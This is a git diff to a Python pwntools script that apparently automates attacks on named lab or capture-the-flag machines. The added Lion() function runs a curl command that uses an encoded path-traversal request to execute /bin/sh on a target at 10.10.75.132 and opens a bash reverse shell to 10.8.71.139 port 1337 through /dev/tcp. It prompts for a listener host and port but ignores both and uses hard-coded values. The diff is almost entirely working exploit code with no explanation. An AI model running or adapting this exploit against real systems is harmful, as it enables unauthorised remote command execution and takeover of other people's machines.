@@ -2,8 +2,8 @@ from pwn import *
 import requests
 import os
 import ftplib
-import re
 
+# machineName = input("Enter Machine Name: ")
 sess = requests.session()
 usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"
 
@@ -112,6 +112,14 @@ def Fortune():
     time.sleep(1)
     shell.interactive()
 
+def Lion():
+    global ip, sess
+    LHOST = input("[*] Enter LHOST: ")
+    LPORT = input("[*] Enter Listening Port: ")
+    command = f"""curl -s -X POST 'http://10.10.75.132:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "sleep 2;/bin/bash -i >& /dev/tcp/10.8.71.139/1337 0>&1"'"""
+    os.system(command)
+    print(command)
+
 if __name__ == "__main__":
     if len(sys.argv) < 3 :
         print(usage)
@@ -130,6 +138,8 @@ if __name__ == "__main__":
             H1()
         if machineName == "Fortune" or machineName == "fortune":
             Fortune()
+        if machineName == "Lion" or machineName == "lion":
+            Lion()
         else:
             print("[!] Invalid Machine Name")
             exit()
